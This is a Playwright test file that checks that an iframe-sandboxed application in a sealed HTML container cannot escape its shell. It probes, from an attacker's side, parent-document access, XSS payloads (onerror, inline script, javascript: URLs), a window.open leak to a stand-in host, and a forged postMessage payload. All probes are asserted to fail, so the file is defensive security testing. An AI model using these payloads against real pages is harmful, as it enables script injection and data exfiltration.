import { expect, test } from "@playwright/test";
import { dirname, resolve } from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";

const container = pathToFileURL(
  resolve(dirname(fileURLToPath(import.meta.url)), "fixture/fixture.dai.html"),
).href;

/**
 * The isolation boundary, asserted rather than assumed.
 *
 * Containment is the format's central claim, and until these pass it is a
 * decorative one: `allow-same-origin` puts the application in the same origin
 * as the shell meant to contain it, where it can read the public key out of the
 * DOM, rewrite the bootloader, and forge anything the bridge reports. Integrity
 * is checked before mount so it cannot un-fail its own check — but saves are
 * self-perpetuating, so it can rewrite the bootloader that gets sealed into the
 * copy the next person opens.
 *
 * These tests are written from the attacker's side on purpose. Each one is a
 * thing a hostile application would try, and each must be impossible rather
 * than merely discouraged.
 */
test.describe("the application cannot reach its own shell", () => {
  test("the frame runs at an opaque origin", async ({ page }) => {
    await page.goto(container);
    const app = page.frameLocator("iframe");
    await app.locator("body").waitFor({ timeout: 20_000 });

    // A sandboxed frame without allow-same-origin reports "null": it belongs to
    // no origin, so nothing else can be same-origin with it either.
    const origin = await app.locator("body").evaluate(() => window.origin);
    expect(origin).toBe("null");
  });

  test("the frame cannot read the shell's document", async ({ page }) => {
    await page.goto(container);
    const app = page.frameLocator("iframe");
    await app.locator("body").waitFor({ timeout: 20_000 });

    const reach = await app.locator("body").evaluate(() => {
      try {
        // The public key and the integrity policy are meta tags in the shell.
        // Reading them is the first step in replacing them.
        const doc = (window.parent as unknown as { document?: Document }).document;
        return doc ? "readable" : "no document";
      } catch (error) {
        return "blocked: " + (error as Error).name;
      }
    });

    expect(reach).toMatch(/^blocked:/);
  });

  test("the frame cannot rewrite the bootloader that gets saved", async ({ page }) => {
    await page.goto(container);
    const app = page.frameLocator("iframe");
    await app.locator("body").waitFor({ timeout: 20_000 });

    const wrote = await app.locator("body").evaluate(() => {
      try {
        const parentWindow = window.parent as unknown as Record<string, unknown>;
        parentWindow.__DAI_TAMPER__ = true;
        return "wrote";
      } catch (error) {
        return "blocked: " + (error as Error).name;
      }
    });

    expect(wrote).toMatch(/^blocked:/);
    // And nothing landed, in case the write silently targeted the frame itself.
    expect(await page.evaluate(() => "__DAI_TAMPER__" in window)).toBe(false);
  });

  test("the application cannot open a window", async ({ page }) => {
    await page.goto(container);
    const app = page.frameLocator("iframe");
    await app.locator("body").waitFor({ timeout: 20_000 });

    // window.open is an exfiltration channel no CSP directive governs: the URL
    // carries the data. Asserted behaviourally rather than by reading the
    // sandbox attribute, because the attribute is a claim and this is the
    // effect.
    const opened = await app.locator("body").evaluate(() => {
      try {
        const win = window.open("https://example.invalid/?leak=1", "_blank");
        if (win) {
          win.close();
          return "opened";
        }
        return "refused";
      } catch (error) {
        return "threw: " + (error as Error).name;
      }
    });

    expect(opened).not.toBe("opened");
  });

  test("web storage is present but keeps nothing", async ({ page }) => {
    await page.goto(container);
    const app = page.frameLocator("iframe");
    await app.locator("body").waitFor({ timeout: 20_000 });

    // Deliberate, and worth pinning. At an opaque origin localStorage throws
    // rather than returning null, and sqlite3ApiBootstrap reads it — so the
    // engine could not start without a stand-in. An in-memory one also matches
    // what the format promises: data belongs in the file, and anything written
    // to browser storage would stay on the machine that wrote it.
    const behaviour = await app.locator("body").evaluate(() => {
      try {
        localStorage.setItem("dai-probe", "kept");
        return {
          writes: localStorage.getItem("dai-probe"),
          isRealStorage: localStorage instanceof Storage,
        };
      } catch (error) {
        return { writes: "threw: " + (error as Error).name, isRealStorage: false };
      }
    });

    expect(behaviour.writes).toBe("kept");
    expect(behaviour.isRealStorage).toBe(false);
  });

  test("script the author did not seal does not execute", async ({ page }) => {
    await page.goto(container);
    const app = page.frameLocator("iframe");
    await app.locator("body").waitFor({ timeout: 20_000 });

    /*
     * The live path this closes. An application that renders a value into the
     * DOM — a task title, a note, any row read back out of its own database —
     * used to be rendering it under a policy that allowed inline script, so a
     * title reading `<img onerror=…>` executed.
     *
     * A nonce cannot rescue an event handler whatever its value, which is why
     * removing 'unsafe-inline' is the whole of the fix and why the nonce being
     * fixed at compile time costs nothing here.
     */
    const ran = await app.locator("body").evaluate(async () => {
      const win = window as unknown as Record<string, unknown>;
      const host = document.createElement("div");
      document.body.appendChild(host);

      host.innerHTML =
        '<img src="data:," onerror="window.__EVENT_HANDLER_RAN__ = true">' +
        '<script>window.__INLINE_SCRIPT_RAN__ = true;<' + "/script>";

      const link = document.createElement("a");
      link.href = "javascript:window.__JS_URL_RAN__ = true";
      document.body.appendChild(link);
      link.click();

      await new Promise((resolve) => setTimeout(resolve, 250));
      return {
        eventHandler: win.__EVENT_HANDLER_RAN__ === true,
        inlineScript: win.__INLINE_SCRIPT_RAN__ === true,
        javascriptUrl: win.__JS_URL_RAN__ === true,
      };
    });

    expect(ran.eventHandler, "an onerror attribute must not run").toBe(false);
    expect(ran.inlineScript, "an injected script element must not run").toBe(false);
    expect(ran.javascriptUrl, "a javascript: URL must not run").toBe(false);
  });

  test("the sealed application's own inline script still runs", async ({ page }) => {
    await page.goto(container);
    const app = page.frameLocator("iframe");
    await app.locator("body").waitFor({ timeout: 20_000 });

    // The other half of the same rule. Author code was present when the
    // container was sealed and is covered by its digest, so the loader stamps
    // it; if this stopped working, every application carrying a script block
    // would be broken by the policy that protects it.
    const bridge = await app.locator("body").evaluate(
      () => typeof (window as unknown as Record<string, unknown>).dai,
    );
    expect(bridge).toBe("object");
  });

  test("the shell grants no capability the application could abuse", async ({ page }) => {
    await page.goto(container);

    const flags = await page.locator("iframe").getAttribute("sandbox");
    const granted = (flags ?? "").split(/\s+/).filter(Boolean);

    // allow-popups is an exfiltration channel no CSP directive governs:
    // window.open carries a URL, and a URL carries data.
    expect(granted).not.toContain("allow-popups");
    expect(granted).not.toContain("allow-same-origin");
    expect(granted).not.toContain("allow-top-navigation");
    expect(granted).not.toContain("allow-top-navigation-by-user-activation");

    // What remains has to be enough to run an application and nothing more.
    expect(granted).toContain("allow-scripts");
  });
});

/**
 * The frame handshake, from the side that would abuse it.
 *
 * Both of these were found by review rather than by the tests above, which
 * asserted what the boundary prevents and not what its own protocol accepts.
 */
test.describe("the loader's handshake", () => {
  test("a payload from anywhere but the shell is ignored", async ({ page }) => {
    await page.goto(container);
    const app = page.frameLocator("iframe");
    await app.locator("body").waitFor({ timeout: 20_000 });

    /*
     * Waited for, not just present.
     *
     * The application announces itself with `data-ready`, and until it does its
     * own markup is still changing. Snapshotting a booting document and
     * comparing it four hundred milliseconds later reports a normal boot
     * finishing as a document that was tampered with — which is what this test
     * did, on WebKit, about once in a hundred runs.
     */
    await app.locator("[data-ready]").waitFor({ timeout: 20_000 });

    // postMessage is reachable across origins by anyone holding a WindowProxy,
    // and an embedder can reach this frame through contentWindow.frames[0]. A
    // loader that accepted the message would write an attacker's document into
    // a frame the shell had already vouched for — and the nonce is no defence,
    // being derived from a public UUID and carried in the message besides.
    const before = await app.locator("body").innerHTML();

    await app.locator("body").evaluate(() => {
      window.postMessage(
        {
          type: "dai:payload",
          entryHtml: "<h1 id='injected'>replaced</h1>",
          assets: [],
          sqlite: new ArrayBuffer(0),
          wasm: null,
          glueSource: null,
          syntheticOrigin: "file:///dai/app/",
          nonce: "",
          bridgeSource: "",
          handshakeSource: "",
          facts: {},
        },
        "*",
      );
    });

    await page.waitForTimeout(400);
    expect(await app.locator("#injected").count()).toBe(0);
    expect(await app.locator("body").innerHTML()).toBe(before);
  });

  test("a second hello does not disturb a running application", async ({ page }) => {
    await page.goto(container);
    const app = page.frameLocator("iframe");
    await app.locator("body").waitFor({ timeout: 20_000 });

    const errors: string[] = [];
    page.on("pageerror", (error) => errors.push(error.message));

    // The buffers are transferred, so they are detached once sent. Answering a
    // second hello would re-post a transfer list of detached buffers and throw
    // DataCloneError out of the shell's own listener.
    await app.locator("body").evaluate(() => {
      parent.postMessage({ type: "dai:frame-hello" }, "*");
    });
    await page.waitForTimeout(400);

    expect(errors.filter((message) => /detached|DataClone/i.test(message))).toEqual([]);
    expect(await app.locator("body").innerHTML()).not.toBe("");
  });
});
